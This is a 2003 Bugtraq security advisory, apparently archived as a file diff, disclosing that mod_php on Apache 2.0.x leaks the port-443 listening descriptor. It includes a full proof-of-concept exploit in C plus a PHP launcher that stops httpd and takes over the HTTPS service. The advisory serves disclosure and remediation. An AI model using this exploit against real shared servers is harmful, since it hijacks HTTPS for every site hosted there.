@@ -1,0 +1,225 @@
+
+Date: 26 Dec 2003 21:35:06 -0000
+From: Steve Grubb <linux_4ever@...oo.com>
+To: bugtraq@...urityfocus.com
+Subject: Hijacking Apache https by mod_php
+
+
+
+
+Product:         PHP - mod_php
+Versions:	 4.2.x, 4.3.x / apache 2.0.x
+URL:		 http://www.php.net
+Impact:          Daemon Hijacking
+Bug class:       Leaked Descriptor
+Vendor notified: Yes
+Fix available:   No
+Date:		 12/26/03
+
+
+Issue:
+======
+Mod_php under apache 2.0.x leaks a critical file descriptor that can be used to takeover (hijack) the https service.
+
+
+Details:
+========
+Because apache httpd and mod_php are inter-related, I
+don't know if you would consider this an apache bug or
+a mod_php bug. I've contacted each group and they both 
+blame each other. Personally, I don't care whose fault 
+it is so long as it gets fixed.
+
+When using mod_php, many file descriptors are leaked to the php script process. If the script page calls external programs by passthru(), exec(), or system(), the descriptors are leaked to that program as well.
+
+One of these descriptors is the listening descriptor to port 443, also known as https. Port 443 is a privileged port and can only be bound to by a root process. It is not normal for that descriptor to be leaked to any or all programs. As a side note, this descriptor seems to be opened by apache regardless of whether or not you use https.
+
+The bug is caused by not making a call to fcntl with the CLOEXEC flag to prevent the leak of a privileged file descriptor. ( It really is a 1 line fix ! )
+
+
+Impact:
+=======
+The listening descriptor is used by all sites on the same machine. If a person can ftp in an executable and has access to php, they may be able to hijack the https service for all sites on the machine. Sandboxing and jailing may not help since the descriptor itself is leaked to the child.
+
+"Safe_mode = on" does not offer any protection for this 
+problem if safe_mode_exec_dir points to a directory hat 
+can be ftp'd to.
+
+
+Exploit:
+========
+The technique is simple. 
+
+1) Fork and daemonize yourself.
+2) Select on the leaked descriptor and start serving pages.
+
+At the end of this advisory is a proof-of-concept program that you can run under mod_php. It is assumed that paying customers can ftp anything they want into their website and mod_php scripting is enabled.
+
+To see the problem first hand, compile the C code:
+
+gcc -o leak-sploit leak-sploit.c -lssl
+cp leak-sploit /var/www/html
+cp install.php /var/www/html
+cp foo-cert.pem /var/www/html
+
+lynx http://localhost/install.php
+
+Now, ps -ef to see how things are going:
+
+root     18176     1  6 15:58 ?    00:00:01 /usr/sbin/httpd
+apache   18180 18176  0 15:58 ?    00:00:00 /usr/sbin/httpd
+apache   18181 18176  0 15:58 ?    00:00:00 /usr/sbin/httpd
+apache   18182 18176  0 15:58 ?    00:00:00 /usr/sbin/httpd
+apache   18183 18176  0 15:58 ?    00:00:00 /usr/sbin/httpd
+apache   18184 18176  0 15:58 ?    00:00:00 /usr/sbin/httpd
+apache   18191     1  0 15:58 ?    00:00:00 /var/www/html/leak-sploit
+
+So far, so good...
+
+lynx https://localhost
+And you should see the "You're owned" message.
+
+This was tested on a fully up2date Red Hat 8.0 & 9 system.
+
+
+Solution:
+=========
+There is no vendor provided solution.
+
+I filed http://bugs.php.net/bug.php?id=20302 on Nov 7, 2002. In retrospect, the bug report is not as detailed as I would like it to have been today, but no one from the php project seemed genuinely interested in investigating this problem.
+
+I also contacted the apache project in August 2002 about this same problem. In October 2002, I re-contacted them about leaked descriptors, they confirmed the problem. Feb 2003 the leaked file descriptors were reported by myself to vuln-dev mail list. The bug was partially fixed in apache 2.0.45. The 
+mod_php vector however is still unfixed.
+
+To see if you are vulnerable, you can use the env_audit program. It comes with directions for testing mod_php in the examples directory.
+
+http://www.web-insights.net/env_audit
+
+
+Best Regards,
+Steve Grubb
+
+
+The code................
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <errno.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <openssl/ssl.h>
+
+/*
+ * The basic actions are like this:
+ *      1) Become session leader
+ *      2) Get rid of the parent (apache)
+ *      3) Start handling requests
+ */
+
+#define LISTEN_DESCRIPTOR 4
+#define CERTF "/var/www/html/foo-cert.pem"
+#define KEYF  "/var/www/html/foo-cert.pem"
+
+static SSL_CTX    *ctx;
+static SSL        *ssl;
+static X509       *client_cert;
+static SSL_METHOD *meth;
+
+static void server_loop(int descr);
+static void ssl_init(void);
+
+int main(int argc, char *argv[])
+{
+    /* Need to fork so apache doesn't kill us */
+    if (fork() == 0) {
+        /* Become session leader */
+        setsid();
+        sleep(2);
+
+        /* just in case one was a controlling tty */
+        close(0); close(1); close(2);
+        ssl_init();
+        server_loop(LISTEN_DESCRIPTOR);
+    }
+    else
+    {
+        sleep(1);
+        system("/usr/sbin/httpd -k stop");
+        sleep(1);
+    }
+    return 0;
+}
+
+static void server_loop(int descr)
+{
+    struct timeval   tv;
+    fd_set read_mask ;
+
+    FD_ZERO(&read_mask);
+    FD_SET(descr, &read_mask);
+    for (;;) {
+        struct sockaddr_in remote;
+        socklen_t len = sizeof(remote);
+        int fd;
+
+        if (select(descr+1, &read_mask, NULL, NULL, 0 ) == -1)
+            continue;
+        fd = accept(descr, &remote, &len);
+        if (fd >=0) {
+            char obuf[1024];
+            if ((ssl = SSL_new (ctx)) != NULL) {
+                SSL_set_fd (ssl, fd);
+                SSL_set_accept_state(ssl);
+                if ((SSL_accept (ssl)) == -1)
+                        exit(1);
+
+                strcpy(obuf, "HTTP/1.0 200 OK\n");
+                strcat(obuf, "Content-Length: 40\n");
+                strcat(obuf, "Content-Type: text/html\n\n");
+                strcat(obuf, "<html><body>You're owned!</body></html>");
+                SSL_write (ssl, obuf, strlen(obuf));
+                SSL_set_shutdown(ssl,
+                        SSL_SENT_SHUTDOWN|SSL_RECEIVED_SHUTDOWN);
+                SSL_free (ssl);
+                ERR_remove_state(0);
+            }
+            close(fd);
+        }
+    }
+    SSL_CTX_free (ctx);  /* Never gets called */
+}
+
+static void ssl_init(void)
+{
+        SSL_load_error_strings();
+        SSLeay_add_ssl_algorithms();
+        meth = SSLv23_server_method();
+        ctx = SSL_CTX_new (meth);
+        if (!ctx)
+                exit(1);
+        if (SSL_CTX_use_certificate_file(ctx, CERTF,
+                        SSL_FILETYPE_PEM) <= 0)
+                exit(1);
+        if (SSL_CTX_use_PrivateKey_file(ctx, KEYF,
+                        SSL_FILETYPE_PEM) <= 0)
+                exit(1);
+        if (!SSL_CTX_check_private_key(ctx))
+                exit(1);
+}
+
+
+install.php.....
+
+<html><head>
+<title>leak-sploit for PHP 4.3</title>
+</head>
+<body>
+    <?php
+        print('Installing exploit.<br>');
+        passthru("/var/www/html/leak-sploit");
+    ?>
+</body></html>
+
+
